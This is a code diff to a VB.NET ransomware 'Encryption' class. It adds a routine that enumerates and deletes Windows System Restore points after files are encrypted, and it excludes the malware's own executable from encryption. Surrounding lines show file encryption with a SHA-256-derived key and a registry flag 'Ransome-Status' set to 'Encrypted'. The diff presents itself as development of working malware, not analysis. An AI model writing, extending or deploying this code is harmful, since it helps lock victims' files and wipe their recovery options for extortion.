@@ -16,7 +16,7 @@ Public Class Encryption
     Private num As Integer
     Public Mynote
     Public Mywallpaper
-    Public Shared SPL As String = "|'L'|"
+    Public Shared SPL As String = Main.SPL
 
 
 
@@ -64,7 +64,7 @@ Public Class Encryption
 
     Public Sub EncryptFile(ByVal file As String, ByVal password As String)
         On Error Resume Next
-        If file <> Application.ExecutablePath Then
+        If file <> Application.ExecutablePath AndAlso file <> Main.FULLPATH Then
             Dim bytesToBeEncrypted As Byte() = IO.File.ReadAllBytes(file)
             Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
             passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
@@ -128,6 +128,8 @@ Public Class Encryption
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Encrypted")
 
             SC()
+
+            DeleteRestorePoints()
 
             Try
                 Main.CloseMe()
@@ -213,6 +215,22 @@ Public Class Encryption
 
     End Sub
 
+    <Runtime.InteropServices.DllImport("Srclient.dll")>
+    Public Shared Function SRRemoveRestorePoint(index As Integer) As Integer
+    End Function
+    Sub DeleteRestorePoints()
+
+        Try
+            Dim objClass As New Management.ManagementClass("\\.\root\default", "systemrestore", New System.Management.ObjectGetOptions())
+            Dim objCol As Management.ManagementObjectCollection = objClass.GetInstances()
+
+            For Each objItem As Management.ManagementObject In objCol
+                SRRemoveRestorePoint(CUInt(objItem("sequencenumber")).ToString())
+            Next
+        Catch ex As Exception
+        End Try
+
+    End Sub
 
 End Class
 
